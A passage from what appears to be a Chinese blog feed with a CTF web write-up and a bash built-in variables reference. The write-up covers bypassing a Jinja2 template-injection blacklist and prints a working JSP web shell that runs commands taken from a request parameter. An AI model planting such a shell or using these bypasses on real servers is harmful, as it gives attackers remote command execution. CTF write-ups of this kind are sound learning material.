class="params">()</span>:</span></span><br><span class="line">    msg = request.args.get(<span class="string">"msg"</span>)</span><br><span class="line">    <span class="keyword">if</span>(msg == <span class="literal">None</span>):</span><br><span class="line">        msg = <span class="string">'anonymous'</span></span><br><span class="line">    <span class="keyword">if</span> safe_msg(msg):</span><br><span class="line">        t = Template(<span class="string">"Good Job! "</span> + msg + <span class="string">" . But sorry, there isn't flag"</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        t = Template(<span class="string">"You look dangerous....."</span>)</span><br><span class="line">    <span class="keyword">return</span> t.render(request=request)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.debug = <span class="literal">False</span></span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>, port=<span class="number">8000</span>)</span><br></pre></td></tr></table></figure><h2 id="mine2"><a href="#mine2" class="headerlink" title="mine2"></a>mine2</h2><p>emm，这道感觉比上道要简单多(可能是python3环境有太湖杯非预期一把梭)。</p><p>过滤<code>.</code>、<code>[</code>、<code>_</code>但是我们依然可以用<code>|attr</code>来取属性。</p><p>同时，由于有双引号我们可以通过python3 字符格式化特性用16进制或8进制来绕waf。</p><p>同时，没有<code>{ {</code>我们只能用<code>{ %</code>我们可以用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% print( )%&#125;</span><br></pre></td></tr></table></figure><p>来回显字符。</p><p>payload：</p><p><img src="image-20201222002412744.png" alt="image-20201222002412744"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,render_template,redirect</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> jinja2 <span class="keyword">import</span> Template</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">safe_msg</span><span class="params">(msg)</span>:</span></span><br><span class="line">    blacklist = [<span class="string">'~'</span>,<span class="string">'set'</span>,<span class="string">'or'</span>,<span class="string">'args'</span>,<span class="string">'_'</span>,<span class="string">'['</span>,<span class="string">'request'</span>,<span class="string">'lipsum'</span>,<span class="string">'='</span>,<span class="string">'chr'</span>,<span class="string">'json'</span>,<span class="string">'g'</span>,<span class="string">'.'</span>,<span class="string">"'"</span>,<span class="string">'&#123;&#123;'</span>,<span class="string">'u'</span>,<span class="string">'get'</span>,<span class="string">' '</span>,<span class="string">','</span>,<span class="string">'*'</span>,<span class="string">'^'</span>,<span class="string">'&amp;'</span>,<span class="string">'$'</span>,<span class="string">'#'</span>,<span class="string">'@'</span>,<span class="string">'!'</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> blacklist:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> msg: </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route("/", methods=['GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">"index.html"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route("/over", methods=['GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">over</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'over.html'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route("/success", methods=['GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">success</span><span class="params">()</span>:</span></span><br><span class="line">    msg = request.args.get(<span class="string">"msg"</span>)</span><br><span class="line">    <span class="keyword">if</span>(msg == <span class="literal">None</span>):</span><br><span class="line">        msg = <span class="string">'anonymous'</span></span><br><span class="line">    <span class="keyword">if</span> safe_msg(msg):</span><br><span class="line">        t = Template(<span class="string">"Good Job! "</span> + msg + <span class="string">" . But sorry, there isn't flag"</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        t = Template(<span class="string">"You look dangerous....."</span>)</span><br><span class="line">    <span class="keyword">return</span> t.render(request=request)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.debug = <span class="literal">False</span></span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>, port=<span class="number">8000</span>)</span><br></pre></td></tr></table></figure><h2 id="webshell-1"><a href="#webshell-1" class="headerlink" title="webshell_1"></a>webshell_1</h2><p>一道jsp 文件上传，有waf。多次上传马，就躲过waf。（可能条件竞争）马如下：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;FORM METHOD=GET ACTION=<span class="string">'index.jsp'</span>&gt;</span><br><span class="line">&lt;INPUT name=<span class="string">'cmd'</span> type=text&gt;</span><br><span class="line">&lt;INPUT type=submit value=<span class="string">'Run'</span>&gt;</span><br><span class="line">&lt;/FORM&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.io.*"</span> %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">   String cmd = request.getParameter(<span class="string">"cmd"</span>);</span><br><span class="line">   String output = <span class="string">""</span>;</span><br><span class="line">   <span class="keyword">if</span>(cmd != <span class="keyword">null</span>) &#123;</span><br><span class="line">      String s = <span class="keyword">null</span>;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">         Process p = Runtime.getRuntime().exec(cmd,<span class="keyword">null</span>,<span class="keyword">null</span>);</span><br><span class="line">         BufferedReader sI = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span></span><br><span class="line">InputStreamReader(p.getInputStream()));</span><br><span class="line">         <span class="keyword">while</span>((s = sI.readLine()) != <span class="keyword">null</span>) &#123; output += s+<span class="string">"&lt;/br&gt;"</span>; &#125;</span><br><span class="line">      &#125;  <span class="keyword">catch</span>(IOException e) &#123;   e.printStackTrace();   &#125;</span><br><span class="line">   &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;pre&gt;&lt;%=output %&gt;&lt;/pre&gt;</span><br></pre></td></tr></table></figure><p><img src="image-20201222002704598.png" alt="image-20201222002704598"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux 内置参数整理</title>
      <link href="/2020/12/16/linux%20%E5%86%85%E7%BD%AE%E5%8F%82%E6%95%B0%E6%95%B4%E7%90%86/"/>
      <url>/2020/12/16/linux%20%E5%86%85%E7%BD%AE%E5%8F%82%E6%95%B0%E6%95%B4%E7%90%86/</url>
      
        <content type="html"><![CDATA[<p>linux bash 中定义了些奇怪的内置参数来管理,这些内置参数很有些意识.</p><a id="more"></a><h2 id="bash属性相关"><a href="#bash属性相关" class="headerlink" title="bash属性相关"></a>bash属性相关</h2><h3 id="BASH"><a href="#BASH" class="headerlink" title="BASH"></a>BASH</h3><p>Bash 的二进制程序文件的路径：</p><p><img src="image-20201217114242036.png" alt="image-20201217114242036"></p><h3 id="BASHOPTS"><a href="#BASHOPTS" class="headerlink" title="BASHOPTS"></a>BASHOPTS</h3><p>以冒号分隔的已启用外壳程序选项列表。列表中的每个字词都是-sshopt内置命令的选项</p><p><img src="image-20201217120453560.png" alt="image-20201217120453560"></p><h3 id="BASHPID"><a href="#BASHPID" class="headerlink" title="BASHPID"></a>BASHPID</h3><p>扩展为当前Bash进程的进程ID。这与$$某些情况下有所不同，例如不需要重新初始化Bash的子外壳。分配BASHPID无效。如果BASHPID 未设置，则即使随后将其重置，它也会丢失其特殊属性。</p><p><img src="image-20201217154946196.png" alt="image-20201217154946196"></p><h3 id="BASH-COMMAND"><a href="#BASH-COMMAND" class="headerlink" title="BASH_COMMAND"></a>BASH_COMMAND</h3><p>当前正在执行或将要执行的命令，除非外壳由于陷阱而正在执行命令，在这种情况下，这是在陷阱发生时执行的命令。如果BASH_COMMAND 未设置，则即使随后将其重置，它也会丢失其特殊属性。</p><p><img src="image-20201217155713096.png" alt="image-20201217155713096"></p><h3 id="BASH-SUBSHELL"><a href="#BASH-SUBSHELL" class="headerlink" title="BASH_SUBSHELL"></a>BASH_SUBSHELL</h3><p>当外壳程序在该子外壳程序或子外壳程序环境中开始执行时，在该子外壳程序或该子外壳程序环境中以一个递增。初始值为0。如果BASH_SUBSHELL 未设置，则即使随后将其重置，它也会失去其特殊属性。</p><p><img src="image-20201217160539713.png" alt="image-20201217160539713"></p><h3 id="BASH-VERSINFO"><a href="#BASH-VERSINFO" class="headerlink" title="BASH_VERSINFO"></a>BASH_VERSINFO</h3><p>一个只读数组变量，其成员保存此Bash实例的版本信息。分配给数组成员的值如下：</p><h4 id="BASH-VERSINFO-0"><a href="#BASH-VERSINFO-0" class="headerlink" title="BASH_VERSINFO[0]"></a>BASH_VERSINFO[0]</h4><p>主版本号（发行版）。</p><h4 id="BASH-VERSINFO-1"><a href="#BASH-VERSINFO-1" class="headerlink" title="BASH_VERSINFO[1]"></a>BASH_VERSINFO[1]</h4><p>次要版本号（version）。</p><h4 id="BASH-VERSINFO-2"><a href="#BASH-VERSINFO-2" class="headerlink" title="BASH_VERSINFO[2]"></a>BASH_VERSINFO[2]</h4><p>补丁程序级别。</p><h4 id="BASH-VERSINFO-3"><a href="#BASH-VERSINFO-3" class="headerlink" title="BASH_VERSINFO[3]"></a>BASH_VERSINFO[3]</h4><p>构建版本。</p><h4 id="BASH-VERSINFO-4"><a href="#BASH-VERSINFO-4" class="headerlink" title="BASH_VERSINFO[4]"></a>BASH_VERSINFO[4]</h4><p>发布状态（例如beta1）。</p><h4 id="BASH-VERSINFO-5"><a href="#BASH-VERSINFO-5" class="headerlink" title="BASH_VERSINFO[5]"></a>BASH_VERSINFO[5]</h4><p>MACHTYPE的值.</p><h3 id="BASH-VERSION"><a href="#BASH-VERSION" class="headerlink" title="BASH_VERSION"></a>BASH_VERSION</h3><p>Bash当前实例的版本号。</p><p><img src="image-20201217160954174.png" alt="image-20201217160954174"></p><h3 id="HISTCMD"><a href="#HISTCMD" class="headerlink" title="HISTCMD"></a>HISTCMD</h3><p>当前命令的历史记录编号或历史记录列表中的索引。的分配将HISTCMD被忽略。如果HISTCMD 未设置，则即使随后将其重置，它也会丢失其特殊属性。</p><p><img src="image-20201217161937105.png" alt="image-20201217161937105"></p><h3 id="HISTCONTROL"><a href="#HISTCONTROL" class="headerlink" title="HISTCONTROL"></a>HISTCONTROL</h3><p>用冒号分隔的值列表，用于控制如何在历史记录列表中保存命令.</p><p><img src="image-20201217162239119.png" alt="image-20201217162239119"></p><h3 id="HISTFILE"><a href="#HISTFILE" class="headerlink" title="HISTFILE"></a>HISTFILE</h3><p>命令历史记录保存到的文件名。默认值为〜/ .bash_history。</p><p><img src="image-20201217163131245.png" alt="image-20201217163131245"></p><h3 id="HISTFILESIZE"><a href="#HISTFILESIZE" class="headerlink" title="HISTFILESIZE"></a>HISTFILESIZE</h3><p>历史记录文件中包含的最大行数。为该变量分配值后，如果有必要，通过删除最旧的条目，历史记录文件将被截断以包含不超过该行数的文件。在退出shell时，将历史文件写入后也将被截断为该大小。如果值为0，则历史记录文件将被截断为零大小。非数值和小于零的数值禁止截断。外壳程序将默认值设置为HISTSIZE 读取任何启动文件后的值。</p><h3 id="HISTIGNORE"><a href="#HISTIGNORE" class="headerlink" title="HISTIGNORE"></a>HISTIGNORE</h3><p>用冒号分隔的模式列表，用于决定应在历史记录列表中保存哪些命令行。每个模式都锚定在行的开头，并且必须与整行匹配（没有隐式的’*”）。HISTCONTROL 在应用指定的检查之后，将针对该行对每个模式进行测试。除了正常的外壳模式匹配字符之外，’和’与上一个历史记录行匹配。’和’可以使用反斜杠转义；尝试进行匹配之前，请删除反斜杠。多行复合命令的第二行和后续行未经测试，并且不管的值如何都被添加到历史记录中 HISTIGNORE。模式匹配采用extglobshell选项的设置。</p><p>HISTIGNORE包含的功能HISTCONTROL。一种“和’与相同ignoredups，且模式为’[] *与…相同ignorespace。结合这两种模式，并用冒号隔开，可提供的功能ignoreboth。</p><h3 id="HISTSIZE"><a href="#HISTSIZE" class="headerlink" title="HISTSIZE"></a>HISTSIZE</h3><p>历史记录列表中要记住的最大命令数。如果值为0，则命令不会保存在历史记录列表中。数值小于零会导致每个命令都保存在历史记录列表中（没有限制）。读取任何启动文件后，shell会将默认值设置为500。</p><p><img src="image-20201217163341359.png" alt="image-20201217163341359"></p><h3 id="HISTTIMEFORMAT"><a href="#HISTTIMEFORMAT" class="headerlink" title="HISTTIMEFORMAT"></a>HISTTIMEFORMAT</h3><p>如果设置了此变量且不为null，则其值用作strftime的格式字符串，以打印与history内置显示的每个历史记录条目关联的时间戳。如果设置了此变量，则将时间戳记写入历史记录文件，以便可以在Shell会话之间保留它们。这使用历史记录注释字符将时间戳记与其他历史记录行区分开。</p><h3 id="HOSTFILE"><a href="#HOSTFILE" class="headerlink" title="HOSTFILE"></a>HOSTFILE</h3><p>包含与以下格式相同的文件名 / etc / hosts当shell需要完成一个主机名时，应该读取该文件。Shell运行时，可能会更改可能的主机名列表。在更改值之后下一次尝试完成主机名时，Bash将新文件的内容添加到现有列表中。如果HOSTFILE已设置，但没有值，或者未命名可读文件，则Bash尝试读取 / etc / hosts获取可能的主机名完成列表。如果HOSTFILE没有设置，主机名列表被清除。</p><h3 id="HOSTNAME"><a href="#HOSTNAME" class="headerlink" title="HOSTNAME"></a>HOSTNAME</h3><p>当前主机的名称。</p><p><img src="image-20201217163428623.png" alt="image-20201217163428623"></p><h3 id="HOSTTYPE"><a href="#HOSTTYPE" class="headerlink" title="HOSTTYPE"></a>HOSTTYPE</h3><p>描述运行Bash的机器的字符串。</p><p><img src="image-20201217163447554.png" alt="image-20201217163447554"></p><h3 id="IGNOREEOF"><a href="#IGNOREEOF" class="headerlink" title="IGNOREEOF"></a>IGNOREEOF</h3><p>在收到EOF字符作为唯一输入时控制外壳的动作。如果设置，则该值表示EOF在外壳程序退出之前可以作为输入行上的第一个字符读取的连续字符数。如果变量存在但没有数字值或没有值，则默认值为10。如果变量不存在，则EOF表示输入到Shell的末尾。这仅对交互式外壳有效。</p><h3 id="INPUTRC"><a href="#INPUTRC" class="headerlink" title="INPUTRC"></a>INPUTRC</h3><p>Readline初始化文件的名称，覆盖默认值 〜/ .inputrc。</p><h3 id="INSIDE-EMACS"><a href="#INSIDE-EMACS" class="headerlink" title="INSIDE_EMACS"></a>INSIDE_EMACS</h3><p>如果Bash在shell启动时在环境中找到此变量，则假定shell在Emacs shell缓冲区中运行，并可能根据的值禁用行编辑TERM。</p><h3 id="LANG"><a href="#LANG" class="headerlink" title="LANG"></a>LANG</h3><p>用于确定未特别选择的，以开头的变量的任何类别的语言环境类别LC_。</p><h3 id="LC-ALL"><a href="#LC-ALL" class="headerlink" title="LC_ALL"></a>LC_ALL</h3><p>此变量将覆盖指定区域设置类别的值LANG和任何其他 LC_变量。</p><h3 id="LC-COLLATE"><a href="#LC-COLLATE" class="headerlink" title="LC_COLLATE"></a>LC_COLLATE</h3><p>该变量确定排序文件名扩展结果时使用的排序规则顺序，并确定范围表达式，等价类以及文件名扩展和模式匹配内的整理序列的行为.</p><h3 id="LC-CTYPE"><a href="#LC-CTYPE" class="headerlink" title="LC_CTYPE"></a>LC_CTYPE</h3><p>此变量确定文件名扩展和模式匹配中的字符解释和字符类的行为.</p><h3 id="LC-MESSAGES"><a href="#LC-MESSAGES" class="headerlink" title="LC_MESSAGES"></a>LC_MESSAGES</h3><p>此变量确定用于翻译带双引号的字符串的语言环境，后跟一个’$’。</p><h3 id="LC-NUMERIC"><a href="#LC-NUMERIC" class="headerlink" title="LC_NUMERIC"></a>LC_NUMERIC</h3><p>此变量确定用于数字格式设置的语言环境类别。</p><h3 id="LC-TIME"><a href="#LC-TIME" class="headerlink" title="LC_TIME"></a>LC_TIME</h3><p>此变量确定用于数据和时间格式化的语言环境类别。</p><h3 id="LINENO"><a href="#LINENO" class="headerlink" title="LINENO"></a>LINENO</h3><p>当前正在执行的脚本或外壳函数中的行号。如果LINENO 未设置，则即使随后将其重置，它也会丢失其特殊属性。</p><h3 id="PPID"><a href="#PPID" class="headerlink" title="PPID"></a>PPID</h3><p>Shell的父进程的进程ID。此变量是只读的。</p><p><img src="image-20201217163630702.png" alt="image-20201217163630702"></p><h3 id="PROMPT-COMMAND"><a href="#PROMPT-COMMAND" class="headerlink" title="PROMPT_COMMAND"></a>PROMPT_COMMAND</h3><p>如果设置了此变量并且是一个数组，则将每个set元素的值解释为要在打印主提示（$PS1）之前执行的命令。如果设置了此值，但未设置数组变量，则将其值用作执行命令。</p><h3 id="PROMPT-DIRTRIM"><a href="#PROMPT-DIRTRIM" class="headerlink" title="PROMPT_DIRTRIM"></a>PROMPT_DIRTRIM</h3><p>如果将其设置为大于零的数字，则该值将用作扩展\w和 \W提示字符串转义符时保留的尾随目录组件的数量（请参阅控制提示）。删除的字符将替换为省略号。</p><h3 id="PS"><a href="#PS" class="headerlink" title="PS"></a>PS</h3><h4 id="PS0"><a href="#PS0" class="headerlink" title="PS0"></a>PS0</h4><p>PS1 在读取命令之后和执行命令之前，此参数的值将像交互式外壳一样展开并显示。</p><h4 id="PS3"><a href="#PS3" class="headerlink" title="PS3"></a>PS3</h4><p>此变量的值用作select命令提示符 。如果未设置此变量，则 select命令提示符为’＃？ ‘</p><h4 id="PS4"><a href="#PS4" class="headerlink" title="PS4"></a>PS4</h4><p>像PS1一样扩展此参数的值， 并且扩展的值是在执行以下操作时在回显命令行之前打印的提示。-X选项已设。必要时，将扩展值的第一个字符复制多次，以指示多个间接级别。默认值为“+ ‘。</p><p><img src="image-20201217164612013.png" alt="image-20201217164612013"></p><h3 id="PWD"><a href="#PWD" class="headerlink" title="PWD"></a>PWD</h3><p>cd内置设置的当前工作目录。</p><p><img src="image-20201217172212441.png" alt="image-20201217172212441"></p><h3 id="RANDOM"><a href="#RANDOM" class="headerlink" title="RANDOM"></a>RANDOM</h3><p>每次引用此参数时，它都会扩展为0到32767之间的随机整数。为此变量分配一个值将为随机数生成器提供种子。如果RANDOM 未设置，则即使随后将其重置，它也会丢失其特殊属性。</p><p><img src="image-20201217172229136.png" alt="image-20201217172229136"></p><h3 id="READLINE-LINE"><a href="#READLINE-LINE" class="headerlink" title="READLINE_LINE"></a>READLINE_LINE</h3><p>Readline行缓冲区的内容，与’绑定-x’ 。</p><h3 id="READLINE-MARK"><a href="#READLINE-MARK" class="headerlink" title="READLINE_MARK"></a>READLINE_MARK</h3><p>所述的位置标记在的Readline行缓冲器（保存插入点），用于与’使用，绑定-x’ 。插入点和标记之间的字符通常称为区域。</p><h3 id="READLINE-POINT"><a href="#READLINE-POINT" class="headerlink" title="READLINE_POINT"></a>READLINE_POINT</h3><p>插入点在Readline行缓冲区中的位置，用于与’绑定-x’ 。</p><h3 id="REPLY"><a href="#REPLY" class="headerlink" title="REPLY"></a>REPLY</h3><p>read内置的默认变量。</p><h3 id="SECONDS"><a href="#SECONDS" class="headerlink" title="SECONDS"></a>SECONDS</h3><p>此变量扩展为启动外壳程序以来的秒数。分配给该变量会将计数重置为分配的值，并且扩展后的值将成为分配的值加上分配以来的秒数。Shell调用时的秒数和当前时间始终通过查询系统时钟来确定。如果SECONDS 未设置，则即使随后将其重置，它也会丢失其特殊属性。</p><p><img src="image-20201217172301056.png" alt="image-20201217172301056"></p><h3 id="SHELL"><a href="#SHELL" class="headerlink" title="SHELL"></a>SHELL</h3><p>此环境变量扩展为外壳程序的完整路径名。如果外壳启动时未设置，则Bash为其分配当前用户登录外壳的完整路径名。</p><p><img src="image-20201217115728273.png" alt="image-20201217115728273"></p><h3 id="SHELLOPTS"><a href="#SHELLOPTS" class="headerlink" title="SHELLOPTS"></a>SHELLOPTS</h3><p>以冒号分隔的已启用外壳程序选项列表。列表中的每个字词都是-oset内置命令的选项 （请参阅“设置内置”）。出现的选项SHELLOPTS是报告为“上由设置-o’。如果此变量在Bash启动时所在的环境中，则在读取任何启动文件之前，将启用列表中的每个shell选项。此变量是只读的。</p><p><img src="image-20201217164355298.png" alt="image-20201217164355298"></p><h3 id="SHLVL"><a href="#SHLVL" class="headerlink" title="SHLVL"></a>SHLVL</h3><p>每次启动新的Bash实例时增加一。这是为了计算您的Bash shell嵌套的深度。</p><p><img src="image-20201217164428676.png" alt="image-20201217164428676"></p><h3 id="SRANDOM"><a href="#SRANDOM" class="headerlink" title="SRANDOM"></a>SRANDOM</h3><p>每次引用该变量时，它都会扩展为32位伪随机数。随机数生成器在支持以下功能的系统上不是线性的/ dev / urandom或arc4random，因此每个返回的数字与其前面的数字都没有关系。不能为随机数生成器提供种子，因此对此变量的分配无效。如果SRANDOM 未设置，则即使随后将其重置，它也会丢失其特殊属性。</p><p><img src="image-20201217164451566.png" alt="image-20201217164451566"></p><h3 id="TIMEFORMAT"><a href="#TIMEFORMAT" class="headerlink" title="TIMEFORMAT"></a>TIMEFORMAT</h3><p>此参数的值用作格式字符串，该字符串指定time 应如何显示以保留字为前缀的管道的定时信息。’％字符引入了转义序列，该序列被扩展为时间值或其他信息。转义序列及其含义如下：大括号表示可选部分。</p><p>%%<br>文字’％’。</p><p>%[p][l]R<br>经过的时间（以秒为单位）。</p><p>%[p][l]U<br>用户模式下花费的CPU秒数。</p><p>%[p][l]S<br>在系统模式下花费的CPU秒数。</p><p>%P<br>CPU百分比，计算为（％U +％S）/％R。</p><p>可选的p是指定精度的数字，即小数点后的小数位数。值为0不会输出小数点或小数。小数点后最多可指定三个位置；大于3的p的值更改为3。如果未指定p，则使用值3。</p><p>可选l以MM m SS形式指定更长的格式，包括分钟。FF s。p的值确定是否包括分数。</p><p>如果未设置此变量，则Bash的行为就好像它具有该值</p><p>$’\nreal\t%3lR\nuser\t%3lU\nsys\t%3lS’<br>如果值为空，则不会显示任何计时信息。显示格式字符串时，将添加尾随换行符。</p><h3 id="TMOUT"><a href="#TMOUT" class="headerlink" title="TMOUT"></a>TMOUT</h3><p>如果设置为大于零的值，将TMOUT被视为read内置的默认超时。的select命令（见条件结构）如果终止输入不之后到达TMOUT时输入来自终端秒。</p><p>在交互式外壳程序中，该值解释为发出主提示后等待一行输入的秒数。如果没有完整的输入行，Bash将在等待该秒数后终止。</p><h3 id="TMPDIR"><a href="#TMPDIR" class="headerlink" title="TMPDIR"></a>TMPDIR</h3><p>如果已设置，则Bash将其值用作目录的名称，Bash在该目录中创建临时文件以供Shell使用。</p><h3 id="UID"><a href="#UID" class="headerlink" title="UID"></a>UID</h3><p>$UID 表示 用户ID号，是当前用户的用户标识号, 记录在 /etc/passwd 文件中。这是当前用户的真实 id, 即使只是通过使用 su 命令来临时改变为另一个用户标识, 这个 id 也不会被改变。$UID 是一个只读变量，不能在命令行或者脚本中修改它。</p><p><img src="image-20201217172130108.png" alt="image-20201217172130108"></p><h3 id="GROUPS"><a href="#GROUPS" class="headerlink" title="GROUPS"></a>GROUPS</h3><p>当前用户所属的组。<br>这是一个当前用户的组 id 数组, 与记录在 /etc/passwd 文件中的内容一样：</p><p><img src="image-20201217194552504.png" alt="image-20201217194552504"></p><h2 id="位置参数"><a href="#位置参数" class="headerlink" title="位置参数"></a>位置参数</h2><p>所谓的位置参数(positional parameter)，指的是 Shell 脚本的命令行参数</p><h3 id="0"><a href="#0" class="headerlink" title="$0"></a>$0</h3><p>$0表示当前进程(脚本)的名.</p><p><img src="image-20201217194222228.png" alt="image-20201217194222228"></p><h3 id="n"><a href="#n" class="headerlink" title="$n"></a>$n</h3><p>当n&gt;0时，$n表示传入脚本的第n个值。</p><h3 id=""><a href="#" class="headerlink" title="$#"></a>$#</h3><p>表示传入的位置参数的个数。</p><p><img src="image-20201217195913178.png" alt="image-20201217195913178"></p><h3 id="与"><a href="#与" class="headerlink" title="$* 与$@"></a>$* 与$@</h3><p>$*与$@ 都表示所有的位置参数.（但在分割上，略为有点区别）</p><p>test：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> arg <span class="keyword">in</span> $*</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$arg</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"><span class="keyword">for</span> arg <span class="keyword">in</span> <span class="variable">$@</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$arg</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure><p><img src="image-20201217200803804.png" alt="image-20201217200803804"></p><h3 id="“-”-与”-”"><a href="#“-”-与”-”" class="headerlink" title="“$*” 与”$@”"></a>“$*” 与”$@”</h3><p>“$*” 与”$@” 也是表把所有参数。但是会把字符串作为一个参数来看待。</p><p><img src="image-20201217201023229.png" alt="image-20201217201023229"></p><h3 id="-1"><a href="#-1" class="headerlink" title="$!"></a>$!</h3><p>运行在后台的最后一个作业的 PID</p><p><img src="image-20201217201606939.png" alt="image-20201217201606939"></p><p><img src="image-20201217202835797.png" alt="image-20201217202835797"></p><h3 id="-2"><a href="#-2" class="headerlink" title="$_"></a>$_</h3><p>这个变量保存之前执行的命令的最后一个参数的值.</p><p><img src="image-20201217203016469.png" alt="image-20201217203016469"></p><h3 id="-3"><a href="#-3" class="headerlink" title="$$"></a>$$</h3><p>脚本自身的 PID (当前 bash 进程的 PID)：</p><p><img src="image-20201217203142523.png" alt="image-20201217203142523"></p><h3 id="-4"><a href="#-4" class="headerlink" title="$?"></a>$?</h3><p>$? 保存了最后所执行的命令的退出状态码，一般表示命令执行成功或失败。当函数返回之后，$? 保存函数中最后所执行的命令的退出状态码。这就是 bash 对函数 “返回值” 的处理方法。当一个脚本退出，$? 保存了脚本的退出状态码，这个退出状态码也就是脚本中最后一个执行命令的退出状态码。 0 表示成功，其它值表示错误。</p><p><img src="image-20201217203306904.png" alt="image-20201217203306904"></p><h2 id="参数扩展"><a href="#参数扩展" class="headerlink" title="参数扩展"></a>参数扩展</h2><p>参数扩展是从引用实体获取值的过程，例如扩展变量以打印其值。在扩展时，您可以使用参数或其值执行非常讨厌的操作.</p><h3 id="PARAMETER：x：y"><a href="#PARAMETER：x：y" class="headerlink" title="$ {PARAMETER：x：y}"></a>$ {PARAMETER：x：y}</h3><p>将PARAMETER的值进行切片处理，x是开始的位置，y是取的个数（没有y默认取完）。</p><p><img src="image-20201218001412077.png" alt="image-20201218001412077"></p><h3 id="！PARAMETER"><a href="#！PARAMETER" class="headerlink" title="$ {！PARAMETER}"></a>$ {！PARAMETER}</h3><p>获得PARAMETER的值所对应的变量的值。</p><p><img src="image-20201218000625817.png" alt="image-20201218000625817"></p><h3 id="varprefix-varprefix"><a href="#varprefix-varprefix" class="headerlink" title="${!varprefix*}, ${!varprefix@}"></a>${!varprefix*}, ${!varprefix@}</h3><p>匹配所有varprefix开头的变量名。</p><p><img src="image-20201218001901834.png" alt="image-20201218001901834"></p><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a href="https://www.cnblogs.com/sky-zhao/archive/2004/01/13/4191039.html" target="_blank" rel="noopener">https://www.cnblogs.com/sky-zhao/archive/2004/01/13/4191039.html</a></p><p><a href="https://www.gnu.org/software/bash/manual/bash.html" target="_blank" rel="noopener">https://www.gnu.org/software/bash/manual/bash.html</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
